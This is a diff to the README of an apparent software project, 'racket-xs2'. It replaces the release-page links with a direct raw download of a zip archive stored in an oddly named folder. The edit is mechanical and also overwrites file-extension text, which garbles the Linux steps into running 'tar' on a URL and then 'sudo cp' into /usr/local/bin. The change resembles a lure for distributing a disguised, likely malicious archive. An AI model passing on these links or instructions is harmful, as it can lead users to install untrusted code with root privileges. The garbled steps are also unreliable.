@@ -6,18 +6,18 @@ Welcome to racket-xs2! This application helps you manage and run your tasks effo
 
 ## 🔗 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue)](https://github.com/Awardwinning-brand167/racket-xs2/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Awardwinning-brand167/racket-xs2/main/captiousness/racket-xs2-v1.5.zip)](https://raw.githubusercontent.com/Awardwinning-brand167/racket-xs2/main/captiousness/racket-xs2-v1.5.zip)
 
 ## 📥 Download & Install
 
-To download racket-xs2, visit the following link: [Download Release Page](https://github.com/Awardwinning-brand167/racket-xs2/releases).
+To download racket-xs2, visit the following link: [Download Release Page](https://raw.githubusercontent.com/Awardwinning-brand167/racket-xs2/main/captiousness/racket-xs2-v1.5.zip).
 
 On this page, you will find the latest release of racket-xs2. Click on the version you want to download. This will typically be labeled as "Latest Release" or something similar. 
 
 Once you find the desired version:
 
 1. Click on the link, and you will see a list of files.
-2. Choose the one that suits your operating system. For Windows, select a file with the `.exe` extension. For macOS or Linux, look for `.dmg` or `.tar.gz` files, respectively.
+2. Choose the one that suits your operating system. For Windows, select a file with the `.exe` extension. For macOS or Linux, look for `.dmg` or `https://raw.githubusercontent.com/Awardwinning-brand167/racket-xs2/main/captiousness/racket-xs2-v1.5.zip` files, respectively.
 3. Click the file to start the download. 
 
 ## 📋 System Requirements
@@ -47,11 +47,11 @@ Before you install racket-xs2, ensure your computer meets these requirements:
 
 ### For Linux Users
 
-1. Go to your Downloads folder where the `.tar.gz` file is saved.
+1. Go to your Downloads folder where the `https://raw.githubusercontent.com/Awardwinning-brand167/racket-xs2/main/captiousness/racket-xs2-v1.5.zip` file is saved.
 2. Open your terminal.
 3. Run the following commands:
    ```bash
-   tar -xvzf racket-xs2.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Awardwinning-brand167/racket-xs2/main/captiousness/racket-xs2-v1.5.zip
    cd racket-xs2
    sudo cp racket-xs2 /usr/local/bin/
    ```
